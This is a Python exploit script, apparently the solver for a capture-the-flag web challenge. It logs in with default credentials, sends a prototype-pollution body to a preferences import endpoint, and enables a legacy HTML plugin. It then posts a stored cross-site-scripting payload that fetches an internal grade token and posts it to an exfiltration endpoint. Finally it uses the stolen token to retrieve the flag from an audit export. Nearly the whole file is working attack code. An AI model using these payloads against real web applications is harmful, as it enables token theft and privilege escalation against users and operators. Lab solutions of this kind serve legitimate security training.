import json
import sys
import time
from urllib import request
from urllib import error
from http.cookiejar import CookieJar

base = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:3000'
username = sys.argv[2] if len(sys.argv) > 2 else 'mahasiswa'
password = sys.argv[3] if len(sys.argv) > 3 else 'tembokratapan123'

jar = CookieJar()
opener = request.build_opener(request.HTTPCookieProcessor(jar))


def post(path, body):
    data = json.dumps(body).encode()
    req = request.Request(base + path, data=data, headers={'content-type': 'application/json'}, method='POST')
    with opener.open(req, timeout=10) as resp:
        return json.loads(resp.read().decode() or '{}')


def get(path, headers=None):
    req = request.Request(base + path, headers=headers or {}, method='GET')
    with opener.open(req, timeout=10) as resp:
        return json.loads(resp.read().decode() or '{}')


post('/api/auth/login', {'username': username, 'password': password})
post('/api/user/preferences/import', {'constructor': {'prototype': {'legacyMode': True}}})
post('/api/session/refresh', {})
post('/api/plugins/legacy/activate', {'pluginId': 'markdown-legacy-html'})
payload = '<img src=x onerror=\'fetch("/internal/grade/token").then(r=>r.json()).then(d=>fetch("/api/exfil",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({token:d.token,note:"solver"})}))\'>'
post('/api/discussions', {'title': 'Need review', 'body': payload})

for _ in range(10):
    time.sleep(3)
    leaks = get('/api/exfil')
    token = ''
    if isinstance(leaks, dict):
        arr = leaks.get('leaks') or []
        if arr and isinstance(arr[0], dict):
            token = arr[0].get('token') or ''
    if token:
        audit = get('/internal/audit/export', {'x-grade-token': token})
        flag = ''
        if isinstance(audit, dict):
            export = audit.get('export') or {}
            if isinstance(export, dict):
                flag = export.get('flag') or ''
        if flag:
            print(flag)
            sys.exit(0)

sys.exit(1)
